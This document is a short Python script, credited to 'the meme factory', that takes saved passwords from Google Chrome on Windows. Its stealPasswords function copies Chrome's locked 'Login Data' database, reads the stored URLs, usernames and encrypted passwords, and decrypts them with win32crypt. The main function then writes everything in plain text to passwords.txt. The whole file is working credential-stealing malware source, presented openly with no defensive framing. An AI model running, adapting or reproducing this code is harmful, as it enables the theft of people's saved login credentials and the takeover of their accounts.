#Made by the meme factory
#Copyright 2019

#Imports
import os
import sqlite3
import win32crypt
import shutil

#Classes
class SQLite3Connection:
	def __init__(self,path):
		try:
			self.path = path
			self.connection = sqlite3.connect(self.path)
			self.cursor = self.connection.cursor()
		except:
			pass
	def run(self,query):
		self.cursor.execute(query)
		return self.cursor.fetchall()
	def close(self):
		self.connection.close()

class SQLite3LockedConnection:
	def __init__(self,path):
		try:
			self.path = path
			self.newpath = shutil.copy(self.path,"{}\\locked".format(os.getenv("USERPROFILE")))
			self.connection = SQLite3Connection(self.newpath)
		except:
			pass
	def run(self,query):
		return self.connection.run(query)
	def close(self):
		self.connection.close()
		os.remove(self.newpath)

#Functions
def stealPasswords():
	passwords = []
	walkpath = "{}\\Google\\Chrome\\User Data".format(os.getenv("LOCALAPPDATA"))
	for root,dirs,files in os.walk(walkpath):
		for filename in files:
			if "Login Data" in filename:
				try:
					path = os.path.join(root,filename)
					conn = SQLite3LockedConnection(path)
					data = conn.run("SELECT action_url, username_value, password_value from logins")
					if len(data) > 0:
						for pwd in data:
							url = pwd[0]
							username = pwd[1]
							try:
								password = win32crypt.CryptUnprotectData(pwd[2],None,None,None,0)[1].decode()
							except:
								pass
							if password:
								passwords.append({
									"url": url,
									"username": username,
									"password": password
								})
				except:
					pass
	return passwords

def main():
	passwords = stealPasswords()
	with open("passwords.txt","w") as f:
		file = "PASSWORDS\n\n=============================================\n"
		for password in passwords:
			file += "URL: {}\nUsername: {}\nPassword: {}\n".format(password["url"],password["username"],password["password"])
			file += "=============================================\n"
		file += "\n\nMade by the meme factory\nTwitter: @thememefactory5"
		f.write(file)
		f.close()

#Main
if __name__ == "__main__":
	main()